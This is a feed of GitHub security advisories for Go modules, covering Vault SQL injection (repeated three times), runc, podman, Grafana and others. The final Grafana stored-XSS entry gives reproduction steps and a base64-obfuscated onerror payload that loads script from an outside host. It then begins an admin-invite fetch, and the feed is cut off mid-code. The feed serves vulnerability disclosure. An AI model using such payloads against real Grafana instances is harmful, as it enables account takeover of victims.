<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2023-04-01T03:01:27.389Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[github.com/darklynx/request-baskets] request-baskets vulnerable to Server-Side Request Forgery]]></title>
        <id>https://github.com/advisories/GHSA-58g2-vgpg-335q</id>
        <link href="https://github.com/advisories/GHSA-58g2-vgpg-335q"/>
        <updated>2023-03-31T22:44:29.000Z</updated>
        <content type="html"><![CDATA[<p>request-baskets up to v1.2.1 was discovered to contain a Server-Side Request Forgery (SSRF) via the component /api/baskets/{name}. This vulnerability allows attackers to access network resources and sensitive information via a crafted API request.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-27163">https://nvd.nist.gov/vuln/detail/CVE-2023-27163</a></li>
<li><a href="https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3">https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3</a></li>
<li><a href="https://github.com/darklynx/request-baskets">https://github.com/darklynx/request-baskets</a></li>
<li><a href="https://notes.sjtu.edu.cn/s/MUUhEymt7">https://notes.sjtu.edu.cn/s/MUUhEymt7</a></li>
<li><a href="http://request-baskets.com">http://request-baskets.com</a></li>
<li><a href="https://github.com/advisories/GHSA-58g2-vgpg-335q">https://github.com/advisories/GHSA-58g2-vgpg-335q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-58g2-vgpg-335q</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-03-31T21:30:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[atomys.codes/stud42] Stud42 vulnerable to denial of service]]></title>
        <id>https://github.com/advisories/GHSA-3hwm-922r-47hw</id>
        <link href="https://github.com/advisories/GHSA-3hwm-922r-47hw"/>
        <updated>2023-03-31T19:33:45.000Z</updated>
        <content type="html"><![CDATA[<p>Stud42's API is vulnerable to a denial of service because the API pod can be overloaded by the GraphQL parser.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/42Atomys/stud42/security/advisories/GHSA-3hwm-922r-47hw">https://github.com/42Atomys/stud42/security/advisories/GHSA-3hwm-922r-47hw</a></li>
<li><a href="https://github.com/42Atomys/stud42/issues/412">https://github.com/42Atomys/stud42/issues/412</a></li>
<li><a href="https://github.com/advisories/GHSA-3hwm-922r-47hw">https://github.com/advisories/GHSA-3hwm-922r-47hw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3hwm-922r-47hw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-03-31T19:33:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/vault] HashiCorp Vault’s Microsoft SQL Database Storage Backend Vulnerable to SQL Injection Via Configuration File]]></title>
        <id>https://github.com/advisories/GHSA-v3hp-mcj5-pg39</id>
        <link href="https://github.com/advisories/GHSA-v3hp-mcj5-pg39"/>
        <updated>2023-03-31T20:07:21.000Z</updated>
        <content type="html"><![CDATA[<p>HashiCorp Vault and Vault Enterprise versions 0.8.0 until 1.13.1 are vulnerable to an SQL injection attack when using the Microsoft SQL (MSSQL) Database Storage Backend. When configuring the MSSQL plugin, certain parameters are required to establish a connection (schema, database, and table) are not sanitized when passed to the user-provided MSSQL database. A privileged attacker with the ability to write arbitrary data to Vault's configuration may modify these parameters to execute a malicious SQL command when the Vault configuration is applied. This issue is fixed in versions 1.13.1, 1.12.5, and 1.11.9.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-0620">https://nvd.nist.gov/vuln/detail/CVE-2023-0620</a></li>
<li><a href="https://discuss.hashicorp.com/t/hcsec-2023-12-vault-s-microsoft-sql-database-storage-backend-vulnerable-to-sql-injection-via-configuration-file/52080/1">https://discuss.hashicorp.com/t/hcsec-2023-12-vault-s-microsoft-sql-database-storage-backend-vulnerable-to-sql-injection-via-configuration-file/52080/1</a></li>
<li><a href="https://github.com/hashicorp/vault/pull/19591">https://github.com/hashicorp/vault/pull/19591</a></li>
<li><a href="https://github.com/hashicorp/vault/releases/tag/v1.11.9">https://github.com/hashicorp/vault/releases/tag/v1.11.9</a></li>
<li><a href="https://github.com/hashicorp/vault/releases/tag/v1.12.5">https://github.com/hashicorp/vault/releases/tag/v1.12.5</a></li>
<li><a href="https://github.com/hashicorp/vault/releases/tag/v1.13.1">https://github.com/hashicorp/vault/releases/tag/v1.13.1</a></li>
<li><a href="https://github.com/advisories/GHSA-v3hp-mcj5-pg39">https://github.com/advisories/GHSA-v3hp-mcj5-pg39</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v3hp-mcj5-pg39</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-03-30T03:30:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/vault] HashiCorp Vault’s Microsoft SQL Database Storage Backend Vulnerable to SQL Injection Via Configuration File]]></title>
        <id>https://github.com/advisories/GHSA-v3hp-mcj5-pg39</id>
        <link href="https://github.com/advisories/GHSA-v3hp-mcj5-pg39"/>
        <updated>2023-03-31T20:07:21.000Z</updated>
        <content type="html"><![CDATA[<p>HashiCorp Vault and Vault Enterprise versions 0.8.0 until 1.13.1 are vulnerable to an SQL injection attack when using the Microsoft SQL (MSSQL) Database Storage Backend. When configuring the MSSQL plugin, certain parameters are required to establish a connection (schema, database, and table) are not sanitized when passed to the user-provided MSSQL database. A privileged attacker with the ability to write arbitrary data to Vault's configuration may modify these parameters to execute a malicious SQL command when the Vault configuration is applied. This issue is fixed in versions 1.13.1, 1.12.5, and 1.11.9.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-0620">https://nvd.nist.gov/vuln/detail/CVE-2023-0620</a></li>
<li><a href="https://discuss.hashicorp.com/t/hcsec-2023-12-vault-s-microsoft-sql-database-storage-backend-vulnerable-to-sql-injection-via-configuration-file/52080/1">https://discuss.hashicorp.com/t/hcsec-2023-12-vault-s-microsoft-sql-database-storage-backend-vulnerable-to-sql-injection-via-configuration-file/52080/1</a></li>
<li><a href="https://github.com/hashicorp/vault/pull/19591">https://github.com/hashicorp/vault/pull/19591</a></li>
<li><a href="https://github.com/hashicorp/vault/releases/tag/v1.11.9">https://github.com/hashicorp/vault/releases/tag/v1.11.9</a></li>
<li><a href="https://github.com/hashicorp/vault/releases/tag/v1.12.5">https://github.com/hashicorp/vault/releases/tag/v1.12.5</a></li>
<li><a href="https://github.com/hashicorp/vault/releases/tag/v1.13.1">https://github.com/hashicorp/vault/releases/tag/v1.13.1</a></li>
<li><a href="https://github.com/advisories/GHSA-v3hp-mcj5-pg39">https://github.com/advisories/GHSA-v3hp-mcj5-pg39</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v3hp-mcj5-pg39</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-03-30T03:30:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/vault] HashiCorp Vault’s Microsoft SQL Database Storage Backend Vulnerable to SQL Injection Via Configuration File]]></title>
        <id>https://github.com/advisories/GHSA-v3hp-mcj5-pg39</id>
        <link href="https://github.com/advisories/GHSA-v3hp-mcj5-pg39"/>
        <updated>2023-03-31T20:07:21.000Z</updated>
        <content type="html"><![CDATA[<p>HashiCorp Vault and Vault Enterprise versions 0.8.0 until 1.13.1 are vulnerable to an SQL injection attack when using the Microsoft SQL (MSSQL) Database Storage Backend. When configuring the MSSQL plugin, certain parameters are required to establish a connection (schema, database, and table) are not sanitized when passed to the user-provided MSSQL database. A privileged attacker with the ability to write arbitrary data to Vault's configuration may modify these parameters to execute a malicious SQL command when the Vault configuration is applied. This issue is fixed in versions 1.13.1, 1.12.5, and 1.11.9.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-0620">https://nvd.nist.gov/vuln/detail/CVE-2023-0620</a></li>
<li><a href="https://discuss.hashicorp.com/t/hcsec-2023-12-vault-s-microsoft-sql-database-storage-backend-vulnerable-to-sql-injection-via-configuration-file/52080/1">https://discuss.hashicorp.com/t/hcsec-2023-12-vault-s-microsoft-sql-database-storage-backend-vulnerable-to-sql-injection-via-configuration-file/52080/1</a></li>
<li><a href="https://github.com/hashicorp/vault/pull/19591">https://github.com/hashicorp/vault/pull/19591</a></li>
<li><a href="https://github.com/hashicorp/vault/releases/tag/v1.11.9">https://github.com/hashicorp/vault/releases/tag/v1.11.9</a></li>
<li><a href="https://github.com/hashicorp/vault/releases/tag/v1.12.5">https://github.com/hashicorp/vault/releases/tag/v1.12.5</a></li>
<li><a href="https://github.com/hashicorp/vault/releases/tag/v1.13.1">https://github.com/hashicorp/vault/releases/tag/v1.13.1</a></li>
<li><a href="https://github.com/advisories/GHSA-v3hp-mcj5-pg39">https://github.com/advisories/GHSA-v3hp-mcj5-pg39</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v3hp-mcj5-pg39</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-03-30T03:30:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/opencontainers/runc] runc AppArmor bypass with symlinked /proc]]></title>
        <id>https://github.com/advisories/GHSA-g2j6-57v7-gm8c</id>
        <link href="https://github.com/advisories/GHSA-g2j6-57v7-gm8c"/>
        <updated>2023-03-30T20:20:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>It was found that AppArmor, and potentially SELinux, can be bypassed when <code>/proc</code> inside the container is symlinked with a specific mount configuration.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in runc v1.1.5, by prohibiting symlinked <code>/proc</code>: <a href="https://github.com/opencontainers/runc/pull/3785">https://github.com/opencontainers/runc/pull/3785</a></p>
<p>This PR fixes CVE-2023-27561 as well.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Avoid using an untrusted container image.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/opencontainers/runc/security/advisories/GHSA-g2j6-57v7-gm8c">https://github.com/opencontainers/runc/security/advisories/GHSA-g2j6-57v7-gm8c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-28642">https://nvd.nist.gov/vuln/detail/CVE-2023-28642</a></li>
<li><a href="https://github.com/opencontainers/runc/pull/3785">https://github.com/opencontainers/runc/pull/3785</a></li>
<li><a href="https://github.com/advisories/GHSA-g2j6-57v7-gm8c">https://github.com/advisories/GHSA-g2j6-57v7-gm8c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g2j6-57v7-gm8c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-03-30T20:20:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/opencontainers/runc] rootless: `/sys/fs/cgroup` is writable when cgroupns isn't unshared in runc]]></title>
        <id>https://github.com/advisories/GHSA-m8cg-xc2p-r3fc</id>
        <link href="https://github.com/advisories/GHSA-m8cg-xc2p-r3fc"/>
        <updated>2023-03-30T20:17:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>It was found that rootless runc makes <code>/sys/fs/cgroup</code> writable in following conditons:</p>
<ol>
<li>when runc is executed inside the user namespace, and the <code>config.json</code> does not specify the cgroup namespace to be unshared (e.g.., <code>(docker|podman|nerdctl) run --cgroupns=host</code>, with Rootless Docker/Podman/nerdctl)</li>
<li>or, when runc is executed outside the user namespace, and <code>/sys</code> is mounted with <code>rbind, ro</code> (e.g., <code>runc spec --rootless</code>; this condition is very rare)</li>
</ol>
<p>A container may gain the write access to user-owned cgroup hierarchy <code>/sys/fs/cgroup/user.slice/...</code> on the host .
Other users's cgroup hierarchies are not affected.</p>
<h3 id="patches">Patches</h3>
<p>v1.1.5 (planned)</p>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Condition 1: Unshare the cgroup namespace (<code>(docker|podman|nerdctl) run --cgroupns=private)</code>. This is the default behavior of Docker/Podman/nerdctl on cgroup v2 hosts.</li>
<li>Condition 2 (very rare): add <code>/sys/fs/cgroup</code> to <code>maskedPaths</code></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/opencontainers/runc/security/advisories/GHSA-m8cg-xc2p-r3fc">https://github.com/opencontainers/runc/security/advisories/GHSA-m8cg-xc2p-r3fc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-25809">https://nvd.nist.gov/vuln/detail/CVE-2023-25809</a></li>
<li><a href="https://github.com/opencontainers/runc/commit/0d62b950e60f6980b54fe3bafd9a9c608dc1df17">https://github.com/opencontainers/runc/commit/0d62b950e60f6980b54fe3bafd9a9c608dc1df17</a></li>
<li><a href="https://github.com/advisories/GHSA-m8cg-xc2p-r3fc">https://github.com/advisories/GHSA-m8cg-xc2p-r3fc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m8cg-xc2p-r3fc</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2023-03-30T20:17:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/usememos/memos] usememos/memos Cross-Site Request Forgery vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-642q-2q68-9j3p</id>
        <link href="https://github.com/advisories/GHSA-642q-2q68-9j3p"/>
        <updated>2023-03-30T19:55:17.000Z</updated>
        <content type="html"><![CDATA[<p>Cross-Site Request Forgery (CSRF) in GitHub repository usememos/memos 0.9.0 and prior.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-4849">https://nvd.nist.gov/vuln/detail/CVE-2022-4849</a></li>
<li><a href="https://github.com/usememos/memos/commit/c9bb2b785dc5852655405d5c9ab127a2d5aa3948">https://github.com/usememos/memos/commit/c9bb2b785dc5852655405d5c9ab127a2d5aa3948</a></li>
<li><a href="https://huntr.dev/bounties/404ce7dd-f345-4d98-ad80-c53ac74f4e5c">https://huntr.dev/bounties/404ce7dd-f345-4d98-ad80-c53ac74f4e5c</a></li>
<li><a href="https://github.com/advisories/GHSA-642q-2q68-9j3p">https://github.com/advisories/GHSA-642q-2q68-9j3p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-642q-2q68-9j3p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-12-29T18:30:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/opencontainers/runc] Opencontainers runc Incorrect Authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-vpvm-3wq2-2wvm</id>
        <link href="https://github.com/advisories/GHSA-vpvm-3wq2-2wvm"/>
        <updated>2023-03-29T14:46:17.000Z</updated>
        <content type="html"><![CDATA[<p>runc 1.0.0-rc95 through 1.1.4 has Incorrect Access Control leading to Escalation of Privileges, related to <code>libcontainer/rootfs_linux.go</code>. To exploit this, an attacker must be able to spawn two containers with custom volume-mount configurations, and be able to run custom images. NOTE: this issue exists because of a CVE-2019-19921 regression.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-27561">https://nvd.nist.gov/vuln/detail/CVE-2023-27561</a></li>
<li><a href="https://github.com/opencontainers/runc/issues/2197#issuecomment-1437617334">https://github.com/opencontainers/runc/issues/2197#issuecomment-1437617334</a></li>
<li><a href="https://github.com/opencontainers/runc/issues/3751">https://github.com/opencontainers/runc/issues/3751</a></li>
<li><a href="https://gist.github.com/LiveOverflow/c937820b688922eb127fb760ce06dab9">https://gist.github.com/LiveOverflow/c937820b688922eb127fb760ce06dab9</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2023/03/msg00023.html">https://lists.debian.org/debian-lts-announce/2023/03/msg00023.html</a></li>
<li><a href="https://github.com/opencontainers/runc/pull/3785">https://github.com/opencontainers/runc/pull/3785</a></li>
<li><a href="https://github.com/opencontainers/runc/releases/tag/v1.1.5">https://github.com/opencontainers/runc/releases/tag/v1.1.5</a></li>
<li><a href="https://github.com/advisories/GHSA-vpvm-3wq2-2wvm">https://github.com/advisories/GHSA-vpvm-3wq2-2wvm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vpvm-3wq2-2wvm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-03-03T21:30:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/gophish/gophish] Gophish vulnerable to Denial of Service via crafted payload involving autofocus]]></title>
        <id>https://github.com/advisories/GHSA-8gg8-wr4j-v2wr</id>
        <link href="https://github.com/advisories/GHSA-8gg8-wr4j-v2wr"/>
        <updated>2023-03-28T02:42:25.000Z</updated>
        <content type="html"><![CDATA[<p>Gophish through 0.12.1 allows attackers to cause a Denial of Service (DoS) via a crafted payload involving autofocus.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-45003">https://nvd.nist.gov/vuln/detail/CVE-2022-45003</a></li>
<li><a href="https://github.com/gophish/gophish/releases/tag/v0.12.1">https://github.com/gophish/gophish/releases/tag/v0.12.1</a></li>
<li><a href="https://pastebin.com/z5MD3z8c">https://pastebin.com/z5MD3z8c</a></li>
<li><a href="https://github.com/advisories/GHSA-8gg8-wr4j-v2wr">https://github.com/advisories/GHSA-8gg8-wr4j-v2wr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8gg8-wr4j-v2wr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-03-22T21:30:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/containers/podman/v4] Podman Time-of-check Time-of-use (TOCTOU) Race Condition]]></title>
        <id>https://github.com/advisories/GHSA-qwqv-rqgf-8qh8</id>
        <link href="https://github.com/advisories/GHSA-qwqv-rqgf-8qh8"/>
        <updated>2023-03-27T22:33:22.000Z</updated>
        <content type="html"><![CDATA[<p>A Time-of-check Time-of-use (TOCTOU) flaw was found in podman. This issue may allow a malicious user to replace a normal file in a volume with a symlink while exporting the volume, allowing for access to arbitrary files on the host file system.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-0778">https://nvd.nist.gov/vuln/detail/CVE-2023-0778</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2168256">https://bugzilla.redhat.com/show_bug.cgi?id=2168256</a></li>
<li><a href="https://github.com/containers/podman/pull/17528">https://github.com/containers/podman/pull/17528</a></li>
<li><a href="https://github.com/containers/podman/pull/17532">https://github.com/containers/podman/pull/17532</a></li>
<li><a href="https://github.com/containers/podman/commit/6ca857feb07a5fdc96fd947afef03916291673d8">https://github.com/containers/podman/commit/6ca857feb07a5fdc96fd947afef03916291673d8</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2023-0778">https://access.redhat.com/security/cve/CVE-2023-0778</a></li>
<li><a href="https://github.com/advisories/GHSA-qwqv-rqgf-8qh8">https://github.com/advisories/GHSA-qwqv-rqgf-8qh8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qwqv-rqgf-8qh8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-03-27T21:30:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/grafana/grafana] Grafana Cross-site Scripting vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-7phr-6cc9-4m5q</id>
        <link href="https://github.com/advisories/GHSA-7phr-6cc9-4m5q"/>
        <updated>2023-03-27T22:13:46.000Z</updated>
        <content type="html"><![CDATA[<p><code>public/app/features/panel/panel_ctrl.ts</code> in Grafana before 6.2.5 allows HTML Injection in panel drilldown links (via the Title or url field).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-13068">https://nvd.nist.gov/vuln/detail/CVE-2019-13068</a></li>
<li><a href="https://github.com/grafana/grafana/issues/17718">https://github.com/grafana/grafana/issues/17718</a></li>
<li><a href="https://github.com/grafana/grafana/releases/tag/v6.2.5">https://github.com/grafana/grafana/releases/tag/v6.2.5</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20190710-0001/">https://security.netapp.com/advisory/ntap-20190710-0001/</a></li>
<li><a href="http://packetstormsecurity.com/files/171500/Grafana-6.2.4-HTML-Injection.html">http://packetstormsecurity.com/files/171500/Grafana-6.2.4-HTML-Injection.html</a></li>
<li><a href="https://github.com/advisories/GHSA-7phr-6cc9-4m5q">https://github.com/advisories/GHSA-7phr-6cc9-4m5q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7phr-6cc9-4m5q</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-24T16:49:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost-server/v6] Mattermost subject to Denial of Service via upload of special GIF]]></title>
        <id>https://github.com/advisories/GHSA-m7w4-q5vg-5xfp</id>
        <link href="https://github.com/advisories/GHSA-m7w4-q5vg-5xfp"/>
        <updated>2023-03-27T14:28:00.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost version 7.1.x and earlier fails to sufficiently process a specifically crafted GIF file when it is uploaded while drafting a post, which allows authenticated users to cause resource exhaustion while processing the file, resulting in server-side Denial of Service.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-3257">https://nvd.nist.gov/vuln/detail/CVE-2022-3257</a></li>
<li><a href="https://hackerone.com/reports/1620170">https://hackerone.com/reports/1620170</a></li>
<li><a href="https://mattermost.com/security-updates/">https://mattermost.com/security-updates/</a></li>
<li><a href="https://github.com/advisories/GHSA-m7w4-q5vg-5xfp">https://github.com/advisories/GHSA-m7w4-q5vg-5xfp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m7w4-q5vg-5xfp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-09-25T00:00:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/openshift/assisted-installer] OpenShift Assisted Installer leaks image pull secrets as plaintext in installation logs]]></title>
        <id>https://github.com/advisories/GHSA-g8xm-p2h4-v6jp</id>
        <link href="https://github.com/advisories/GHSA-g8xm-p2h4-v6jp"/>
        <updated>2023-03-24T21:59:19.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was found in OpenShift Assisted Installer. During generation of the Discovery ISO, image pull secrets were leaked as plaintext in the installation logs. An authenticated user could exploit this by re-using the image pull secret to pull container images from the registry as the associated user.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3684">https://nvd.nist.gov/vuln/detail/CVE-2021-3684</a></li>
<li><a href="https://github.com/openshift/assisted-installer/commit/2403dad3795406f2c5d923af0894e07bc8b0bdc4">https://github.com/openshift/assisted-installer/commit/2403dad3795406f2c5d923af0894e07bc8b0bdc4</a></li>
<li><a href="https://github.com/openshift/assisted-installer/commit/f3800cfa3d64ce6dcd6f7b73f0578bb99bfdaf7a">https://github.com/openshift/assisted-installer/commit/f3800cfa3d64ce6dcd6f7b73f0578bb99bfdaf7a</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1985962">https://bugzilla.redhat.com/show_bug.cgi?id=1985962</a></li>
<li><a href="https://github.com/advisories/GHSA-g8xm-p2h4-v6jp">https://github.com/advisories/GHSA-g8xm-p2h4-v6jp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g8xm-p2h4-v6jp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-03-24T21:30:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/grafana/grafana] Grafana Stored Cross-site Scripting in Graphite FunctionDescription tooltip]]></title>
        <id>https://github.com/advisories/GHSA-qrrg-gw7w-vp76</id>
        <link href="https://github.com/advisories/GHSA-qrrg-gw7w-vp76"/>
        <updated>2023-03-23T20:10:48.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When a Graphite data source is added, one can use this data source in a dashboard. This contains a feature to use <code>Functions</code>. Once a function is selected, a small tooltip will be shown when hovering over the name of the function. This tooltip will allow you to delete the selected Function from your query or show the Function Description. However, no sanitization is done when adding this description to the DOM. Since it is not uncommon to connect to public data sources, and attacker could host a Graphite instance with modified Function Descriptions containing XSS payloads. When the victim uses it in a query and accidentally hovers over the Function Description, an attacker controlled XSS payload will be executed. This can be used to add the attacker as an Admin for example. </p>
<h3 id="details">Details</h3>
<ol>
<li>Spin up your own Graphite instance. I've done this using the <code>make devenv sources=graphite</code>.</li>
<li>Now start a terminal for your Graphite container and modify the following file <code>/opt/graphite/webapp/graphite/render/functions.py</code> </li>
<li>Basically you can pick any function but I picked the <code>aggregateSeriesLists</code> function. Modify its description to be <code>"&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vY20yLnRlbCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))&gt;</code></li>
</ol>
<p>The result would look like this:</p>
<pre><code class="language-python">def aggregateSeriesLists(requestContext, seriesListFirstPos, seriesListSecondPos, func, xFilesFactor=None):
  """                                                                              
                                                                                              
  "&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vY20yLnRlbCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))&gt;
                                                                           
  """                  
  if len(seriesListFirstPos) != len(seriesListSecondPos):   
    raise InputParameterError(             
      "seriesListFirstPos and seriesListSecondPos argument must have equal length")
  results = []                                          
                                    
  for i in range(0, len(seriesListFirstPos)):        
    firstSeries = seriesListFirstPos[i]                                           
    secondSeries = seriesListSecondPos[i]         
    aggregated = aggregate(requestContext, (firstSeries, secondSeries), func, xFilesFactor=xFilesFactor) 
    if not aggregated: # empty list, no data found                          
      continue                   
    result = aggregated[0]  # aggregate() can only return len 1 list           
    result.name = result.name[:result.name.find('Series(')] + 'Series(%s,%s)' % (firstSeries.name, secondSeries.name)
    results.append(result)                                                                           
  return results                                                         
                                                                                                                   
                                                                                                       
aggregateSeriesLists.group = 'Combine'                                                             
aggregateSeriesLists.params = [
  Param('seriesListFirstPos', ParamTypes.seriesList, required=True),
  Param('seriesListSecondPos', ParamTypes.seriesList, required=True),
  Param('func', ParamTypes.aggFunc, required=True),                                                       
  Param('xFilesFactor', ParamTypes.float),                                
]                                                                                                
</code></pre>
<ol start="4">
<li>Save and quit the file. Restart your Graphite Container (I did this using the Restart Icon in Docker Desktop)</li>
<li>Now login to your Grafana instance as an Organisation Admin.</li>
<li>Navigate to http://[grafana]/plugins/graphite and click <code>Create a Graphite data source</code></li>
<li>Add the url to the attackers Graphite instance (maybe enable <code>Skip TLS Verify</code>) and click <code>Save &amp; test</code> and <code>Explore</code></li>
<li>In the newly opened page click the + icon next to <code>Functions</code> and search for <code>aggregateSeriesLists</code> and click it to add it.</li>
<li>Now hover over <code>aggregateSeriesLists</code> with your mouse and move your mouse to the <code>?</code> icon.</li>
</ol>
<h3 id="result">Result</h3>
<p>Our payload will trigger and in this case it will include an external script to trigger the alerts.</p>
<h4 id="decoded-payload">Decoded payload</h4>
<pre><code class="language-javascript">var a=document.createElement("script");a.src="https://cm2.tel";document.body.appendChild(a);
</code></pre>
<p><img alt="image" src="https://user-images.githubusercontent.com/26874824/225035735-5d00e5d9-3302-4257-8f95-dd562e752893.png"></p>
<h3 id="impact">Impact</h3>
<p>In the POC we've picked 1 function to have a XSS payload, but a real attacker would of course maximize the likelihood by replacing all of it's descriptions with XSS payloads. As shown above the attacker can now run arbitrary javascript in the browser of the victim. The victim can be any user using the malicious Graphite instance in a query (or while Exploring), including the Organisation Admin. If so, an attacker could include a payload to add them as an admin themselves.</p>
<p>An example would be something like this:</p>
<pre><code class="language-javascript">fetch("/api/org/invites", {
